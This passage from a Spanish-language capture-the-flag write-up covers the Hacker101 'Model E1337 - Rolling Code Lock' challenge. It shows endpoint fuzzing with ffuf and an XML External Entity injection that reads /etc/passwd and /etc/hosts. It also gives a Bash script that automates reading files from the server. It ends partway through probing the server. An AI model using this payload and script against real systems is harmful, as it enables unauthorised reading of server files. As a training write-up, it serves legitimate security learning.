<!doctype html><html lang=es>
<head>
<title>Model E1337 - Rolling Code Lock | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Tenemos una simple página web que solicita un código para desbloquear:
Podemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:
No hay nada en el código fuente de la página. En este punto, podemos aplicar fuzzing para enumerar más rutas existentes:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  Existe una ruta /admin:">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/web-cryptography.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Model E1337 - Rolling Code Lock">
<meta property="og:description" content="Tenemos una simple página web que solicita un código para desbloquear:
Podemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:
No hay nada en el código fuente de la página. En este punto, podemos aplicar fuzzing para enumerar más rutas existentes:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  Existe una ruta /admin:">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/ctf/hacker101ctf/model-e1337-rolling-code-lock/"><meta property="article:section" content="ctf">
<meta property="article:modified_time" content="2022-02-28T12:50:17+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/web-cryptography.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Model E1337 - Rolling Code Lock">
<meta itemprop=description content="Tenemos una simple página web que solicita un código para desbloquear:
Podemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:
No hay nada en el código fuente de la página. En este punto, podemos aplicar fuzzing para enumerar más rutas existentes:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  Existe una ruta /admin:">
<meta itemprop=dateModified content="2022-02-28T12:50:17+01:00">
<meta itemprop=wordCount content="11212">
<meta itemprop=keywords content>
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Model E1337 - Rolling Code Lock">
<meta name=twitter:description content="Tenemos una simple página web que solicita un código para desbloquear:
Podemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:
No hay nada en el código fuente de la página. En este punto, podemos aplicar fuzzing para enumerar más rutas existentes:
$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ admin [Status: 200, Size: 287, Words: 25, Lines: 11] unlock [Status: 405, Size: 178, Words: 20, Lines: 5] [Status: 200, Size: 302, Words: 16, Lines: 13]  Existe una ruta /admin:">
<meta name=twitter:image content="https://7rocky.github.io/images/web-cryptography.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/ctf/hacker101ctf/model-e1337-rolling-code-lock/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HACKER101CTF</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/hacker101ctf/model-e1337-rolling-code-lock/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/hacker101ctf/model-e1337-rolling-code-lock/&text=Model%20E1337%20-%20Rolling%20Code%20Lock" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/ctf/hacker101ctf/model-e1337-rolling-code-lock/&title=Model%20E1337%20-%20Rolling%20Code%20Lock" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">Model E1337 - Rolling Code Lock</h1>
<br>
</header>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Tenemos una simple página web que solicita un código para desbloquear:</p>
<p><img src=/images/Hacker101CTF/Rolling-Code-1.png alt=Website></p>
<p>Podemos poner cualquier número y, después de unos segundos, veremos que es incorrecto:</p>
<p><img src=/images/Hacker101CTF/Rolling-Code-2.png alt="Wrong code"></p>
<p>No hay nada en el código fuente de la página. En este punto, podemos aplicar <em>fuzzing</em> para enumerar más rutas existentes:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://35.190.155.168/c33a5d03b6/FUZZ  
admin                   [Status: <span class=code-dark-green>200</span>, Size: 287, Words: 25, Lines: 11]
unlock                  [Status: <span class=code-dark-yellow>405</span>, Size: 178, Words: 20, Lines: 5]
                        [Status: <span class=code-dark-green>200</span>, Size: 302, Words: 16, Lines: 13]
</code></pre></div>
<p>Existe una ruta <code>/admin</code>:</p>
<p><img src=/images/Hacker101CTF/Rolling-Code-3.png alt="Admin site"></p>
<p>El código fuente de esta página contiene información útil:</p>
<p><img src=/images/Hacker101CTF/Rolling-Code-4.png alt="Admin site source code"></p>
<p>Si vamos a <code>/get-config</code>, veremos un documento XML</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/get-config
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;Front door&lt;/location&gt;&lt;/config&gt;  
</code></pre></div>
<p>Como es XML, podría existir una vulnerabilidad de Entidad Externa XML (XXE). Si existe <code>/get-config</code>, es probable que exista <code>/set-config</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;  
</code></pre></div>
<p>Se obtiene un error 400 Bad Request, por lo que seguramente necesitamos añadir parámetros en la URL (por GET) o un cuerpo de petición (usando POST):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?location=asdf'</span>
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;  

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -d location=asdf
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;405 Method Not Allowed&lt;/title&gt;
&lt;h1&gt;Method Not Allowed&lt;/h1&gt;
&lt;p&gt;The method is not allowed for the requested URL.&lt;/p&gt;
</code></pre></div>
<p>No parece que sea una petición POST. Como el parámetro <code>location</code> no funciona, podemos aplicar <em>fuzzing</em> sobre el nombre del parámetro con <code>ffuf</code> y filtrar por el código de estado 400:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?FUZZ=asdf'</span> -mc all -fc 400  
data                    [Status: <span class=code-dark-red>500</span>, Size: 291, Words: 38, Lines: 5]
</code></pre></div>
<p>Si el parámetro se llama <code>data</code> obtenemos un error 500 Internal Server Error:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> <span class=code-dark-yellow>'http://35.190.155.168/c33a5d03b6/set-config?data=asdf'</span>
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;500 Internal Server Error&lt;/title&gt;
&lt;h1&gt;Internal Server Error&lt;/h1&gt;
&lt;p&gt;The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.&lt;/p&gt;  
</code></pre></div>
<p>Vamos a probar a poner el documento XML de <code>/get-config</code> en el parámetro <code>data</code>, pero cambiando el valor de la etiqueta <code>location</code> por <code>asdf</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode <span class=code-dark-yellow>'data=&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;asdf&lt;/location&gt;&lt;/config&gt;'</span>  
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="admin"&gt;admin&lt;/a&gt;.  If not click the link.

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/admin
&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Model E1337 &amp;mdash; Home&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Admin Panel&lt;/h1&gt;
    &lt;p&gt;Lock location: &lt;input type="text" name="location" value="asdf" disabled&gt;&lt;/p&gt;
    &lt;!-- We should be using get-config for this on the client side. --&gt;
  &lt;/body&gt;
&lt;/html&gt;

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/admin -s | <span class=code-dark-green>grep</span> asdf
    &lt;p&gt;Lock location: &lt;input type="text" name="location" value="<span class=code-red>asdf</span>" disabled&gt;&lt;/p&gt;
</code></pre></div>
<p>El valor que aparece en <code>/admin</code> ha cambiado. Ahora podemos introducir otro documento XML para leer archivos del sistema utilizando una Entidad Externa XML como esta:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[ &lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt; ]</span><span class=mtk1>&gt;</span>  
<span class=mtk1>&lt;</span><span class=mtk5>config</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>location</span><span class=mtk1>&gt;</span><span class=mtk6>&amp;xxe;</span><span class=mtk1>&lt;/</span><span class=mtk5>location</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;/</span><span class=mtk5>config</span><span class=mtk1>&gt;</span>
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/set-config -G --data-urlencode <span class=code-dark-yellow>'data=&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;config&gt;&lt;location&gt;&amp;xxe;&lt;/location&gt;&lt;/config&gt;'</span>  
&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
&lt;title&gt;Redirecting...&lt;/title&gt;
&lt;h1&gt;Redirecting...&lt;/h1&gt;
&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="admin"&gt;admin&lt;/a&gt;.  If not click the link.

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/admin
&lt;!doctype html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;Model E1337 &mdash; Home&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Admin Panel&lt;/h1&gt;
    &lt;p&gt;Lock location: &lt;input type="text" name="location" value="root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
" disabled&gt;&lt;/p&gt;
    &lt;!-- We should be using get-config for this on the client side. --&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div>
<p>Y obtenemos el archivo <code>/etc/passwd</code> del servidor. En este punto, podemos crear un simple <em>script</em> en Bash para obtener el contenido de un archivo dada la ruta absoluta (si existe), para automatizar el proceso:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>bash</span>

<span class=mtk1>url=$1</span>
<span class=mtk1>file=$2</span>

<span class=mtk1>xml=</span><span class=mtk4>"&lt;?xml version=</span><span class=mtk6>\"</span><span class=mtk4>1.0</span><span class=mtk6>\"</span><span class=mtk4>?&gt;</span>
<span class=mtk4>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM</span> <span class=mtk6>\"</span><span class="mtk4 detected-link">file://</span><span class="mtk1 detected-link">$file</span><span class=mtk6>\</span><span class=mtk6>"</span><span class=mtk4>&gt; ]&gt;</span>
<span class=mtk4>&lt;config&gt;</span>
  <span class=mtk4>&lt;location&gt;</span>
    <span class=mtk4>BEGINTAG</span>
<span class=mtk4>&amp;xxe; ENDTAG</span>
  <span class=mtk4>&lt;/location&gt;</span>
<span class=mtk4>&lt;/config&gt;"</span>

<span class=mtk1>curl</span> <span class=mtk1>$url/set-config</span> <span class=mtk1>-G</span> <span class=mtk1>--data-urlencode</span> <span class=mtk4>"data=</span><span class=mtk1>$xml</span><span class=mtk4>"</span> <span class=mtk5>&amp;&gt;</span><span class=mtk1>/dev/null</span>

<span class=mtk1>res=</span><span class=mtk4>$(curl</span> <span class=mtk1>$url</span><span class=mtk4>/admin -s)</span>

<span class=mtk1>begin=</span><span class=mtk4>$(( $(echo "</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk4>grep</span> <span class=mtk5>-</span><span class=mtk4>n BEGINTAG</span> <span class=mtk5>|</span> <span class=mtk4>awk</span> <span class=mtk5>-</span><span class=mtk4>F</span> <span class=mtk5>:</span> <span class=mtk4>'{</span> <span class=mtk4>print</span> <span class=mtk1>$1</span> <span class=mtk4>}')</span> <span class=mtk5>+</span> <span class=mtk6>1</span> <span class=mtk4>))</span>  
<span class=mtk1>end=</span><span class=mtk4>$((</span> <span class=mtk4>$(echo</span> <span class=mtk4>"</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk4>grep</span> <span class=mtk5>-</span><span class=mtk4>n ENDTAG</span> <span class=mtk5>|</span> <span class=mtk4>awk</span> <span class=mtk5>-</span><span class=mtk4>F</span> <span class=mtk5>:</span> <span class=mtk4>'{ print</span> <span class=mtk1>$1</span> <span class=mtk4>}')</span> <span class=mtk5>-</span> <span class=mtk6>1</span> <span class=mtk4>))</span>

<span class=mtk7>echo</span> <span class=mtk1>-n</span> <span class=mtk4>"</span><span class=mtk1>$res</span><span class=mtk4>"</span> <span class=mtk5>|</span> <span class=mtk1>sed</span> <span class=mtk1>-n</span> <span class=mtk4>"</span><span class=mtk1>${begin}</span><span class=mtk4>,</span><span class=mtk1>${end}</span><span class=mtk4>p"</span>
</code></pre></div>
<p>Ahora con este <em>script</em> en Bash podemos leer archivos del servidor especificando una ruta absoluta:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> xxe.sh http://35.190.155.168/c33a5d03b6 /etc/hosts  
127.0.0.1  localhost
::1  localhost ip6-localhost ip6-loopback
fe00::0  ip6-localnet
ff00::0  ip6-mcastprefix
ff02::1  ip6-allnodes
ff02::2  ip6-allrouters
172.18.0.20  c33a5d03b6b4
</code></pre></div>
<p>Aunque sabemos que el servidor tiene nginx, no podemos mostrar archivos de configuración como <code>/etc/nginx/nginx.conf</code> o <code>/etc/nginx/sites-enabled/default</code>.</p>
<p>Sin embargo, podemos deducir que el servidor está ejecutando Flask (un <em>framework</em> web para Python), ya que los mensajes de respuesta HTTP están en letras mayúsculas:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> http://35.190.155.168/c33a5d03b6/doesnotexist -I  
HTTP/1.1 404 NOT FOUND
<span class=code-white>Server</span>: nginx/1.14.0 (Ubuntu)
<span class=code-white>Date</span>:
<span class=code-white>Content-Type</span>: text/html
<span class=code-white>Content-Length</span>: 233
<span class=code-white>Connection</span>: keep-alive
<span class=code-white>Cache-Control</span>: public, max-age=0
<span class=code-white>Pragma</span>: no-cache
